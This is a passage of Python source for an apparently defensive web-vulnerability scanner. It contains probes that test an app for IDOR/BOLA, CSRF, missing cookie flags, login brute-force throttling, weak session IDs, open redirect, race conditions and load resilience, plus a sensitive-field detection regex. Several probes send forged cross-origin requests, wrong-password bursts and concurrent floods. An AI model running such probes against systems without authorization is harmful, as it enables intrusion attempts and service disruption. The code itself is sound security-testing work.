    """The id of a just-created object: a Location header tail, or an id-like field in the JSON body."""
    loc = resp.headers.get("location")
    if loc:
        return loc.rstrip("/").rsplit("/", 1)[-1]
    try:
        data = resp.json()
    except (ValueError, httpx.HTTPError):
        return None
    candidates = [data] + ([v for v in data.values() if isinstance(v, dict)] if isinstance(data, dict) else [])
    for node in candidates:
        if isinstance(node, dict):
            for k in ("id", "_id", "uuid", "slug"):
                if isinstance(node.get(k), (str, int)):
                    return node[k]
    return None


# A cross-user-readable object is only unambiguous slop when it carries an INHERENTLY private field —
# a shared catalog is also readable by everyone but isn't a vuln (that's intent, which humans judge).
# Gating on a sensitive field name keeps this intent-independent: a secret/credential/PII exposed to
# another account is wrong regardless of the app's intent.
_SENSITIVE_FIELD = re.compile(
    r"secret|password|passwd|apikey|api_key|private|token|ssn|social_security|"
    r"credit_?card|card_?number|cvv|iban|passport", re.IGNORECASE)


def api_bola(ctx, probe) -> bool | None:
    """Register two accounts A and B; A creates an object whose sensitive field carries a canary; if B
    can read that object and sees A's canary, object-level authorization is broken. Only pairs whose
    create body has a sensitive field are tested (precision — a shared collection isn't BOLA). N/A when
    there's no such pair or two accounts can't be established."""
    pairs = [(c, r, p, idf) for (c, r, p, idf) in _bola_pairs(ctx.profile.endpoints)
             if any(_SENSITIVE_FIELD.search(f) for f in c.body_fields)]
    if not pairs:
        return None  # no create+read pair with a private field to exercise -> couldn't test
    a = auth.register_account(ctx.base_url, ctx.profile, suffix="_a")
    b = auth.register_account(ctx.base_url, ctx.profile, suffix="_b")
    if a is None or b is None:
        for acct in (a, b):
            if acct:
                acct.client.close()
        return None  # couldn't establish two accounts (no JSON register) -> couldn't test
    tested = False
    try:
        with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=True) as anon:
            for create_ep, read_ep, param, id_field in pairs:
                id_value = "hlbola" + secrets.token_hex(4)
                secret_value = "hlsecret" + secrets.token_hex(6)
                # canary only in the sensitive field(s); id field gets the id; others a benign filler
                body = {f: (id_value if f == id_field else
                            secret_value if _SENSITIVE_FIELD.search(f) else "hlfill" + secrets.token_hex(3))
                        for f in create_ep.body_fields}
                try:
                    created = a.client.post(create_ep.path, json=body)
                    if created.status_code not in (200, 201):
                        continue
                    obj_id = id_value if id_field else _created_id(created)
                    if obj_id in (None, ""):
                        continue
                    read_path = read_ep.raw_path.replace(
                        "{" + param + "}", urllib.parse.quote(str(obj_id), safe=""))
                    if anon.get(read_path).status_code not in (401, 403):
                        continue  # read isn't auth-gated -> a public endpoint, not a BOLA
                    tested = True
                    b_read = b.client.get(read_path)
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                if b_read.status_code == 200 and secret_value in b_read.text:
                    return True  # B read A's object AND saw A's planted secret -> broken object auth
        return False if tested else None
    finally:
        a.client.close()
        b.client.close()


def session_cookie_missing_flag(ctx, probe) -> bool | None:
    """Self-as-oracle: register an account, then inspect the session cookie it sets. Slop if it lacks
    the hardening flag named in the probe (httponly | samesite | secure). Returns None (-> N/A) when
    self-registration couldn't establish a session (CSRF/JSON-API app) — a false 'clean' would be a
    missed finding, not a pass."""
    flag = probe.probe.get("flag", "httponly")
    account = auth.register_account(ctx.base_url, ctx.profile)
    if account is None:
        return None  # couldn't self-register -> couldn't test
    try:
        cookie = auth.session_cookie(account.register_response)
        if cookie is None:
            return None  # registration yielded no recognizable session cookie -> couldn't test
        return not cookie[flag]
    finally:
        account.client.close()


def login_no_rate_limit(ctx, probe) -> bool | None:
    """Self-as-oracle: fire N wrong-password logins at the login form; slop if NONE is throttled
    (HTTP 429/423). With no brute-force protection every attempt returns the same auth-failure status,
    enabling credential stuffing / password spraying. Uses its own username so a per-account lockout
    can't collide with other probes that hit /login (e.g. sqli_auth_bypass). N/A when no login form."""
    form = auth.login_form(ctx.profile.forms)
    if form is None:
        return _login_rate_limit_json(ctx, probe)  # no HTML login form -> try a JSON login endpoint
    data = {}
    for name in form.fields:
        low = name.lower()
        if "pass" in low:
            data[name] = "hl-wrong-password"
        elif "email" in low or "mail" in low:
            data[name] = "hacklet_probe_rl@example.com"
        else:
            data[name] = "hacklet_probe_rl"
    attempts = probe.probe.get("attempts", 10)
    with httpx.Client(base_url=ctx.base_url, timeout=15.0, follow_redirects=False) as c:
        for _ in range(attempts):
            try:
                resp = c.request((form.method or "post").upper(), form.action, data=data)
            except (httpx.HTTPError, httpx.InvalidURL):
                return None  # login endpoint unreachable -> couldn't test
            if resp.status_code in (429, 423):
                return False  # throttled -> brute-force protection present -> clean
    return True  # N attempts, never throttled -> no rate limiting -> slop


def _login_rate_limit_json(ctx, probe) -> bool | None:
    """JSON-API fallback for login_no_rate_limit: find a JSON login endpoint (Juice Shop /rest/user/
    login, /api/login, ...) and hammer it with wrong creds. N/A when no JSON login endpoint responds."""
    attempts = probe.probe.get("attempts", 10)
    with make_client(ctx.base_url, ctx.headers, timeout=15.0, follow_redirects=False) as c:
        path, creds, first = auth.find_json_login(c)
        if path is None:
            return None  # no login surface at all -> couldn't test
        if first.status_code in (429, 423):
            return False  # already throttling
        for _ in range(attempts - 1):  # find_json_login already made the first attempt
            try:
                r = c.post(path, json=creds)
            except (httpx.HTTPError, httpx.InvalidURL):
                return None
            if r.status_code in (429, 423):
                return False
    return True


# Redirect destinations that signal a CSRF REJECTION (request not honored) rather than acceptance.
_CSRF_REJECT_HINTS = ("login", "signin", "sign-in", "sign_in", "auth", "error",
                      "denied", "forbidden", "unauthorized")


_CSRF_SKIP = ("login", "signin", "sign-in", "sign_in", "log-in", "logout", "logoff",
              "search", "query", "register", "signup", "sign-up")
_CSRF_STATE = ("password", "passwd", "pwd", "email", "delete", "remove", "update", "change",
               "settings", "profile", "transfer", "role", "account", "new_", "edit", "save", "admin")


def _is_login_form(action_low: str, fields_low: str) -> bool:
    """A plain authentication form (username/email + password, no change/reset indicator) — its cross-
    site submission is login-CSRF (a distinct, lesser issue), not the state-change CSRF we grade."""
    has_pw = "pass" in fields_low
    has_user = any(h in fields_low for h in ("user", "email", "login"))
    changes = any(h in action_low + " " + fields_low
                  for h in ("new", "change", "update", "confirm", "reset", "current", "old"))
    return has_pw and has_user and not changes


def _csrf_candidates(profile):
    """State-changing forms that carry NO anti-CSRF token: a POST, or a form whose action/fields name a
    state change (password/email/delete/settings/...). Login/search/logout/register are excluded."""
    out = []
    for f in profile.forms:
        low, fields_low = f.action.lower(), " ".join(f.fields).lower()
        if any(h in low for h in _CSRF_SKIP) or _is_login_form(low, fields_low):
            continue
        if ((f.method or "get").lower() == "post" or any(h in low + " " + fields_low for h in _CSRF_STATE)) \
                and not any(auth.is_csrf_field(x) for x in f.fields):
            out.append(f)
    return out


def csrf_missing(ctx, probe) -> bool | None:
    """A state-changing request accepted cross-site with no CSRF token and no SameSite cookie -> no
    CSRF defense. Works with a provided --header session OR a self-registered one. Skips forms that
    carry a token; in self-register mode also skips a SameSite session (both valid defenses). N/A when
    there's no candidate form or no session to test with."""
    candidates = _csrf_candidates(ctx.profile)
    if not candidates:
        return None  # no tokenless state-changing form -> N/A
    account = None
    if ctx.headers:                                   # grade the authenticated surface as the given user
        client = make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=False)
    else:                                             # open-registration app: be our own user
        account = auth.register_account(ctx.base_url, ctx.profile, suffix="_csrf")
        if account is None:
            return None
        cookie = auth.session_cookie(account.register_response)
        if cookie is not None and cookie["samesite"]:
            account.client.close()
            return False  # a SameSite session blocks cross-site sending -> already defended
        client = account.client
    try:
        for form in candidates:
            method = (form.method or "post").upper()
            data = {f: ("password" if "pass" in f.lower() else "hl-csrf") for f in form.fields}
            kw = {"params": data} if method == "GET" else {"data": data}
            try:
                resp = client.request(method, form.action, headers={"Origin": "https://evil.example"},
                                      follow_redirects=False, **kw)
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if resp.is_redirect:
                # a redirect to login/auth/error is a CSRF REJECTION, not an accepted state change
                if any(h in resp.headers.get("location", "").lower() for h in _CSRF_REJECT_HINTS):
                    continue
                return True
            if resp.status_code < 400:
                return True  # state-changing, no token, accepted cross-site -> CSRF
        return False
    finally:
        if account is not None:
            account.client.close()
        else:
            client.close()


def _set_cookie_values(resp):
    out = []
    for raw in resp.headers.get_list("set-cookie"):
        first = raw.split(";", 1)[0]
        if "=" in first:
            name, val = first.split("=", 1)
            out.append((name.strip(), val.strip()))
    return out


def _weak_token(values) -> bool:
    """A session token is weak if it's too short, a short numeric counter/timestamp, or sequential."""
    distinct = [v for v in dict.fromkeys(values) if v]
    if not distinct:
        return False
    if all(len(v) <= 8 for v in distinct):
        return True                                     # < ~48 bits -> brute-forceable
    numeric = [v for v in distinct if v.isdigit()]
    if len(numeric) == len(distinct):                   # every token is purely numeric
        if all(len(v) <= 12 for v in distinct):
            return True                                 # a short numeric counter / timestamp
        if len(numeric) >= 3:
            ints = sorted(int(v) for v in numeric)
            if all(0 < ints[i + 1] - ints[i] <= 5 for i in range(len(ints) - 1)):
                return True                             # sequential -> the next id is guessable
    return False


def weak_session_id(ctx, probe) -> bool | None:
    """Weak / predictable session identifiers: collect the session tokens the app issues (across fresh,
    cookieless requests) plus any provided one, and flag short / purely-numeric / sequential values. A
    strong random token (long, mixed alphabet) reads clean. N/A when no session token is observed."""
    samples: dict[str, list] = {}

    def add(name, val):
        if auth._is_session_cookie(name):
            samples.setdefault(name, []).append(val)

    routes = ["/"] + [r for r in ctx.profile.routes
                      if re.search(r"session|login|token|weak|sess|auth", r, re.IGNORECASE)]
    for route in list(dict.fromkeys(routes))[:6]:
        for _ in range(8):
            with make_client(ctx.base_url, ctx.headers, timeout=8.0, follow_redirects=True) as c:
                try:
                    resp = c.get(route)
                except (httpx.HTTPError, httpx.InvalidURL):
                    continue
                for name, val in _set_cookie_values(resp):
                    add(name, val)
    for hv in [v for k, v in (ctx.headers or {}).items() if k.lower() == "cookie"]:
        for part in hv.split(";"):
            if "=" in part:
                add(part.split("=", 1)[0].strip(), part.split("=", 1)[1].strip())
    if not samples:
        return None
    return True if any(_weak_token(vals) for vals in samples.values()) else False


def dom_xss(ctx, probe) -> bool:
    """Browser oracle: inject an executing payload across discovered routes and render — fires when
    it runs in the DOM, catching reflected-that-executes and DOM-sink XSS a source check misses.
    Gated on the `browser` capability, so it's N/A unless the run enabled rendering."""
    return browser.dom_xss_executes(ctx.base_url, ctx.profile.routes, headers=ctx.headers)


def _served(ctx, path: str) -> bool:
    """Does the target path exist (not 404)? Lets a probe fall back from a declared endpoint a real
    target doesn't serve to a representative one (the homepage), instead of silently no-opping."""
    try:
        return ctx.client.get(path).status_code != 404
    except (httpx.HTTPError, httpx.InvalidURL):
        return False


def slow_first_paint(ctx, probe) -> bool:
    """Browser oracle: render and read First Contentful Paint; slop if it exceeds the gate — the
    user-facing 'slow app' signal (client render delay, distinct from server TTFB). Browser-gated.
    Measures the declared page if served, else the homepage (real apps don't serve the reference path)."""
    target = probe.probe.get("target", "/")
    if not _served(ctx, target):
        target = "/"
    url = ctx.base_url.rstrip("/") + target
    # median of N renders, not one sample: FCP is wall-clock timing (JIT warmup, CPU/network jitter),
    # so a single sample near the gate flips between runs -> non-deterministic score. The isinstance
    # filter also drops any non-numeric value a hostile page could inject (would raise TypeError).
    samples = [browser.first_contentful_paint(url, headers=ctx.headers) for _ in range(3)]
    vals = [s for s in samples if isinstance(s, (int, float))]
    if not vals:
        return False
    return statistics.median(vals) > probe.probe.get("threshold_ms", 1000)


def console_errors_present(ctx, probe) -> bool:
    """Browser oracle: the page throws an uncaught JavaScript error on load — broken regardless of
    intent. Browser-gated."""
    url = ctx.base_url.rstrip("/") + probe.probe.get("target", "/")
    n = browser.console_errors(url, headers=ctx.headers)
    return isinstance(n, (int, float)) and n > 0


def a11y_violations_present(ctx, probe) -> bool:
    """Browser oracle: presence-based accessibility violations (missing lang / alt / field label /
    control name) above the threshold. Browser-gated; presence only, so intent-independent."""
    url = ctx.base_url.rstrip("/") + probe.probe.get("target", "/")
    n = browser.a11y_violations(url, headers=ctx.headers)
    return isinstance(n, (int, float)) and n > probe.probe.get("threshold", 0)


_REDIRECT_PARAMS = ("next", "url", "redirect", "return", "dest", "continue", "to", "r")
_REDIRECT_PROBE_HOST = "hacklet-redirect-probe.example"
_REDIRECT_ENDPOINTS = ("/redirect", "/login", "/logout", "/go", "/out", "/auth/callback", "/sso")


def open_redirect(ctx, probe) -> bool:
    """A user-controlled redirect param that sends the browser to an arbitrary EXTERNAL host -> open
    redirect (phishing / OAuth-token theft). Intent-independent: fires only on a 3xx whose Location
    host is our foreign probe host. Tests discovered routes plus common redirect endpoints/params."""
    evil = {p: "https://" + _REDIRECT_PROBE_HOST + "/x" for p in _REDIRECT_PARAMS}
    seen = set()
    with make_client(ctx.base_url, ctx.headers, timeout=10.0, follow_redirects=False) as c:
        for path in list(ctx.profile.routes) + list(_REDIRECT_ENDPOINTS):
            if path in seen:
                continue
            seen.add(path)
            try:
                resp = c.get(path, params=evil)
            except (httpx.HTTPError, httpx.InvalidURL):
                continue
            if resp.is_redirect and urllib.parse.urlparse(
                    resp.headers.get("location", "")).hostname == _REDIRECT_PROBE_HOST:
                return True
    return False


def idor_horizontal(ctx, probe) -> bool | None:
    """Self-as-oracle: register A and B, A creates a resource, B fetches it by URL. If B can read
    A's content, object-level access control is broken (horizontal IDOR). N/A when we can't register
    both accounts or A can't create a distinct resource to test against (not a false clean)."""
    form = auth.create_form(ctx.profile.forms)
    if form is None:
        return None
    a = auth.register_account(ctx.base_url, ctx.profile, suffix="_a")
    b = auth.register_account(ctx.base_url, ctx.profile, suffix="_b")
    if a is None or b is None:
        for acct in (a, b):
            if acct:
                acct.client.close()
        return None
    # extract each session cookie (jar iteration avoids CookieConflict) and re-send it plainly, so an
    # authed create/read isn't dropped over http when the app sets a Secure cookie (that's tested by
    # sec-session-003, separately). Same approach race_resource_ids already uses.
    a_cookies = {c.name: c.value for c in a.client.cookies.jar}
    b_cookies = {c.name: c.value for c in b.client.cookies.jar}
    try:
        marker = "hl-idor-7a3f9c"
        with httpx.Client(base_url=ctx.base_url, timeout=10.0, follow_redirects=True,
                          cookies=a_cookies) as ac:
            resource = ac.post(form.action, data={n: marker for n in form.fields}).url.path
        if not resource or resource == form.action:  # no distinct resource created -> couldn't test
            return None
        with httpx.Client(base_url=ctx.base_url, timeout=10.0, cookies=b_cookies) as bc:
            leaked = bc.get(resource)
        return leaked.status_code == 200 and marker in leaked.text
    except (httpx.HTTPError, httpx.InvalidURL):
        return None
    finally:
        a.client.close()
        b.client.close()


def _fanout(work, n: int):
    """Run `work` (a no-arg callable) n times concurrently; return the n results in submit order.
    The shared concurrency primitive for the self-as-oracle race/load probes."""
    with ThreadPoolExecutor(max_workers=n) as ex:
        return [f.result() for f in [ex.submit(work) for _ in range(n)]]


def _concurrent_creates(base_url, path, cookies, data, n: int = 12):
    def create():
        try:
            with httpx.Client(base_url=base_url, timeout=10.0, follow_redirects=True, cookies=cookies) as c:
                return c.post(path, data=data).url.path
        except Exception:
            return None
    return _fanout(create, n)


def race_resource_ids(ctx, probe) -> bool | None:
    """Self-as-oracle: register, fire N concurrent resource creates, and inspect the assigned IDs.
    Duplicate IDs mean id allocation isn't atomic under concurrency — a race condition. N distinct
    creates must yield N distinct ids, so a collision is provable without knowing the app's intent.
    N/A when there's no create form or we can't self-register (not a false clean)."""
    form = auth.create_form(ctx.profile.forms)
    if form is None:
        return None
    account = auth.register_account(ctx.base_url, ctx.profile, suffix="_race")
    if account is None:
        return None
    try:
        # iterate the jar, not dict(cookies) — dict() raises httpx.CookieConflict when the session
        # cookie was set on multiple paths/domains during the register redirect chain.
        cookies = {c.name: c.value for c in account.client.cookies.jar}
        # fill the form's ACTUAL fields (was hardcoded {"text": ...}); a real create form named
        # content/body/title would otherwise get an empty POST and the race would never be detected.
        data = {f: "hl-race" for f in form.fields}
        urls = _concurrent_creates(ctx.base_url, form.action, cookies, data)
        # a redirect to a login/error page (an unauthenticated/rejected create) is NOT a created
        # resource -> exclude it, so uniform redirects don't look like duplicate ids (a false race).
        created = [u for u in urls if u and u != form.action
                   and not any(h in u.lower() for h in _CSRF_REJECT_HINTS)]
        if len(created) < 2:
            return None  # couldn't create ≥2 resources (CSRF/session) -> couldn't test
        return len(set(created)) < len(created)
    finally:
        account.client.close()


def _concurrent_get(base_url, path, n: int = 20, headers=None):
    def get():
        try:
            with make_client(base_url, headers, timeout=15.0) as c:
                return c.get(path).status_code
        except Exception:
            return None
    return _fanout(get, n)


def load_resilience(ctx, probe) -> bool:
    """Fire a concurrent burst at an endpoint; slop if it falls over (>10% 5xx) under load — the
    resource-exhaustion / unsynchronized-shared-state failure that only surfaces under concurrency."""
    target = probe.probe.get("target", "/")
    if not _served(ctx, target):
        # declared endpoint not served (real app) -> burst the homepage, the representative
        # always-present endpoint. NEVER fan across all routes: concurrent bursts at every endpoint
        # of a live target is a DoS.
        target = "/"
    ratios = []
    for _ in range(3):  # median of N bursts, not one: a target near the 10% gate flips between runs
        statuses = _concurrent_get(ctx.base_url, target, headers=ctx.headers)
        if statuses:
            # None = connection refused/dropped/timeout — a HARDER fall-over than a 500, counted over
            # the whole burst so an app that crashes the connection can't read cleaner than one that 500s.
            failures = sum(1 for s in statuses if s is None or s >= 500)
            ratios.append(failures / len(statuses))
    if not ratios:
        return False
    return statistics.median(ratios) > 0.1


PREDICATES = {
    "sqli_auth_bypass": sqli_auth_bypass,
    "api_sqli": api_sqli,
    "xss_injectable": xss_injectable,
    "command_injection": command_injection,
    "ssti_injectable": ssti_injectable,
    "path_traversal": path_traversal,
    "file_upload": file_upload,
    "weak_session_id": weak_session_id,
    "api_bola": api_bola,
    "session_cookie_missing_flag": session_cookie_missing_flag,
    "login_no_rate_limit": login_no_rate_limit,
    "csrf_missing": csrf_missing,
    "idor_horizontal": idor_horizontal,
    "dom_xss": dom_xss,
    "race_resource_ids": race_resource_ids,
    "load_resilience": load_resilience,
    "slow_first_paint": slow_first_paint,
    "console_errors_present": console_errors_present,
    "a11y_violations_present": a11y_violations_present,
    "open_redirect": open_redirect,
}


# Human-readable "why it fired" reasons for verbose / --failed output, derived from the probe's check.
_MATCHER_REASONS = {
    "response_leaks_stack_trace": "leaked a stack trace",
    "ttfb_at_least": "slow time-to-first-byte (>{arg}s)",
    "response_contains": "reflected the probe payload unescaped",
    "response_missing_header": "missing header: {arg}",
    "response_missing_clickjacking_defense": "no clickjacking defense (X-Frame-Options / CSP frame-ancestors)",
    "response_cors_misconfigured": "reflects an arbitrary Origin with credentials (CORS)",
    "response_server_error": "returned a 5xx server error",
    "response_uncompressed": "sizeable text served without gzip (no Content-Encoding)",
    "response_has_header": "leaks the {arg} header (stack / version disclosure)",
    "response_is_aws_credentials": "served an AWS credentials file at the webroot",
    "response_leaks_credentials": "returned password/credential material in a response body",
    "response_leaks_secret": "leaked a secret (private key / cloud or API token)",
    "response_is_dotenv": "served a .env secrets file",
    "response_is_git_config": "served .git/config (source repo exposed)",
    "response_is_git_head": "served .git/HEAD (source repo exposed)",
}

_PREDICATE_REASONS = {
    "sqli_auth_bypass": "login bypassed by a SQL-injection payload",
    "api_sqli": "a parameter is SQL-injectable (error / boolean / UNION / time-based)",
    "xss_injectable": "an input reflects unescaped into HTML (XSS: script / img / svg / attribute / stored)",
    "command_injection": "an input reaches an OS shell (injected command executed: separator / substitution / time-based)",
    "ssti_injectable": "an input is evaluated by a server-side template engine (SSTI -> code execution)",
    "path_traversal": "a filename param served a file outside the web root (path traversal / local file inclusion)",
    "file_upload": "an uploaded webshell was accepted and executed server-side (insecure file upload -> RCE)",
    "weak_session_id": "session identifiers are weak/predictable (short / numeric / sequential)",
    "api_bola": "one account's object (and its secret) was readable by another account (broken object-level auth)",
    "session_cookie_missing_flag": "session cookie missing the {flag} flag",
    "csrf_missing": "state-changing POST accepted cross-site with no token / SameSite",
    "idor_horizontal": "another account's object was readable by id (broken access control)",
    "dom_xss": "an injected payload executed in the DOM",
    "race_resource_ids": "concurrent creates collided on one id (non-atomic allocation)",
    "load_resilience": "endpoint 5xx'd under a concurrent burst",
    "slow_first_paint": "First Contentful Paint exceeded the gate",
    "login_no_rate_limit": "repeated wrong-password logins were never throttled",
    "console_errors_present": "threw an uncaught JavaScript error on load",
    "a11y_violations_present": "accessibility violations (missing alt / form label / lang / control name)",
    "open_redirect": "a user-controlled parameter redirects to an arbitrary external host",
}


def describe(probe) -> str:
    """Short human reason a probe fires (for verbose / --failed), derived from its predicate or
    slop_if conditions — not live evidence, but enough to know what failed and act on it."""
    p = probe.probe
    if "predicate" in p:
        return _PREDICATE_REASONS.get(p["predicate"], p["predicate"]).format(flag=p.get("flag", ""))
    parts = []
    for cond in probe.slop_if:
        if isinstance(cond, str):
            parts.append(_MATCHER_REASONS.get(cond, cond))
        else:
            ((name, arg),) = cond.items()
            parts.append(_MATCHER_REASONS.get(name, name).format(arg=arg))
    return "; ".join(parts)
